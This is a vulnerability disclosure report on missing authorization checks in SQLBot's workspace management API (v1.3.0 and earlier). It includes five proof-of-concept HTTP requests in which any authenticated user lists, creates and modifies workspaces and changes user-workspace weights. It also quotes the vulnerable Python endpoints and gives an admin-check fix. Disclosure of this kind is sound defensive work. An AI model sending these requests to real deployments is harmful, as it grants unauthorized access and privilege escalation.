# Missing Authorization in Workspace Management APIs

## 1. Vulnerability Title
Missing Authorization Check in Workspace Management APIs of SQLBot

## 2. Product Details
* **Vendor:** SQLBot Team
* **Product:** SQLBot
* **Affected Version(s):** <= v1.3.0
* **Fixed Version:** N/A

## 3. Vulnerability Type (CWE)
* **CWE ID:** CWE-285 (Improper Authorization)
* **Type Name:** Broken Function Level Authorization (BFLA)

## 4. Description (Crucial for CVE Entry)
SQLBot version 1.3.0 and earlier contains multiple missing authorization vulnerabilities in the Workspace Management APIs, allowing any authenticated user to view all workspaces, create new workspaces, modify existing workspaces, view workspace details, and modify user-workspace associations without proper authorization checks.

## 5. Impact
* **Impact Description:** An authenticated attacker with low privileges can:
  - View all workspace information in the system
  - Create arbitrary new workspaces
  - Modify any workspace's configuration
  - View details of any workspace
  - Modify user-workspace association weights (privilege escalation)
* **Attack Vector:** Network (Remote)
* **Privileges Required:** Low (Any authenticated user)

## 6. Proof of Concept (PoC) / Steps to Reproduce

### Prerequisites
1. Deploy SQLBot application
2. Login as a low-privileged user and obtain a valid `x-sqlbot-token`

### PoC 1: Modify User-Workspace Association (PUT /system/workspace/uws)

```http
PUT /api/v1/system/workspace/uws HTTP/1.1
Host: target-server
Content-Type: application/json
x-sqlbot-token: <valid_user_token>

{
    "oid": 1,
    "uid": 2,
    "weight": 1
}
```

**Result:** Successfully modifies user-workspace association weight without authorization check.

### PoC 2: List All Workspaces (GET /system/workspace)

```http
GET /api/v1/system/workspace HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Returns all workspaces in the system without authorization check.

### PoC 3: Create New Workspace (POST /system/workspace)

```http
POST /api/v1/system/workspace HTTP/1.1
Host: target-server
Content-Type: application/json
x-sqlbot-token: <valid_user_token>

{
    "name": "Malicious Workspace"
}
```

**Result:** Successfully creates a new workspace without authorization check.

### PoC 4: Modify Workspace (PUT /system/workspace)

```http
PUT /api/v1/system/workspace HTTP/1.1
Host: target-server
Content-Type: application/json
x-sqlbot-token: <valid_user_token>

{
    "id": 1,
    "name": "Modified Workspace Name"
}
```

**Result:** Successfully modifies workspace without authorization check.

### PoC 5: View Workspace Details (GET /system/workspace/{id})

```http
GET /api/v1/system/workspace/1 HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Returns workspace details without authorization check.

## 7. Vulnerable Code Location

**File:** `backend/apps/system/api/workspace.py`

### Vulnerability #13: PUT /system/workspace/uws (Lines 139-153)

```python
@router.put("/uws")
async def edit(session: SessionDep, trans: Trans, editor: UserWsEditor):
    # Missing: current_user: CurrentUser parameter
    # Missing: Authorization check
    if not editor.oid or not editor.uid:
        raise Exception(trans('i18n_miss_args', key = '[oid, uid]'))
    db_model = session.exec(select(UserWsModel).where(UserWsModel.uid == editor.uid, UserWsModel.oid == editor.oid)).first()
    # ... modifies association without permission check
```

### Vulnerability #14: GET /system/workspace (Lines 172-179)

```python
@router.get("", response_model=list[WorkspaceModel])
async def query(session: SessionDep, trans: Trans):
    # Missing: current_user: CurrentUser parameter
    # Missing: Authorization check
    list_result = session.exec(select(WorkspaceModel)).all()
    # ... returns all workspaces without permission check
```

### Vulnerability #15: POST /system/workspace (Lines 181-186)

```python
@router.post("")
async def add(session: SessionDep, creator: WorkspaceBase):
    # Missing: current_user: CurrentUser parameter
    # Missing: Authorization check
    db_model = WorkspaceModel.model_validate(creator)
    db_model.create_time = get_timestamp()
    session.add(db_model)
    session.commit()
```

### Vulnerability #16: PUT /system/workspace (Lines 188-196)

```python
@router.put("")
async def update(session: SessionDep, editor: WorkspaceEditor):
    # Missing: current_user: CurrentUser parameter
    # Missing: Authorization check
    id = editor.id
    db_model = session.get(WorkspaceModel, id)
    # ... modifies workspace without permission check
```

### Vulnerability #17: GET /system/workspace/{id} (Lines 198-205)

```python
@router.get("/{id}", response_model=WorkspaceModel)
async def get_one(session: SessionDep, trans: Trans, id: int):
    # Missing: current_user: CurrentUser parameter
    # Missing: Authorization check
    db_model = session.get(WorkspaceModel, id)
    # ... returns workspace details without permission check
```

## 8. Remediation

Add proper authorization checks to all affected endpoints. Example fix:

```python
@router.get("", response_model=list[WorkspaceModel])
async def query(session: SessionDep, current_user: CurrentUser, trans: Trans):
    if not current_user.isAdmin:
        raise Exception(trans('i18n_permission.no_permission', url='', msg=trans('i18n_permission.only_admin')))
    list_result = session.exec(select(WorkspaceModel)).all()
    # ...

@router.post("")
async def add(session: SessionDep, current_user: CurrentUser, trans: Trans, creator: WorkspaceBase):
    if not current_user.isAdmin:
        raise Exception(trans('i18n_permission.no_permission', url='', msg=trans('i18n_permission.only_admin')))
    # ...

@router.put("")
async def update(session: SessionDep, current_user: CurrentUser, trans: Trans, editor: WorkspaceEditor):
    if not current_user.isAdmin:
        raise Exception(trans('i18n_permission.no_permission', url='', msg=trans('i18n_permission.only_admin')))
    # ...

@router.get("/{id}", response_model=WorkspaceModel)
async def get_one(session: SessionDep, current_user: CurrentUser, trans: Trans, id: int):
    if not current_user.isAdmin:
        raise Exception(trans('i18n_permission.no_permission', url='', msg=trans('i18n_permission.only_admin')))
    # ...

@router.put("/uws")
async def edit(session: SessionDep, current_user: CurrentUser, trans: Trans, editor: UserWsEditor):
    if not current_user.isAdmin and current_user.weight == 0:
        raise Exception(trans('i18n_permission.no_permission', url='', msg=''))
    # ...
```

## 9. Summary Table

| Endpoint | Method | Severity | Impact |
|----------|--------|----------|--------|
| /system/workspace/uws | PUT | High | Modify user-workspace association |
| /system/workspace | GET | Medium | View all workspaces |
| /system/workspace | POST | High | Create arbitrary workspaces |
| /system/workspace | PUT | High | Modify any workspace |
| /system/workspace/{id} | GET | Medium | View workspace details |
